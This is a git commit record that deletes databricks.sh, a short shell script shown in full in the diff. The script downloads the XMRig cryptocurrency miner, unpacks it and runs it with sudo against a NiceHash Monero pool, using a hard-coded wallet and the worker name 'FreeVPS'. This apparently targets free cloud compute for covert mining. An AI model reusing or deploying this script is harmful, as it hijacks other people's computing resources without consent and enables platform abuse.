1778109742c4ba6b64a359b745d3123eb6137cd4
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2022-04-29 12:48:46 +0200

    Delete databricks.sh

--- databricks.sh
+++
@@ -1,9 +0,0 @@
-sudo apt update
-sudo apt install screen -y
-clear
-screen -R miner
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
-tar xf xmrig-6.16.4-linux-x64.tar.gz
-cd xmrig-6.16.4
-clear
-sudo ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 35maF4TVKyx17a2ooSzQFH5XFE9VvuHLF2.FreeVPS -p x -k -a rx/0 --nicehash
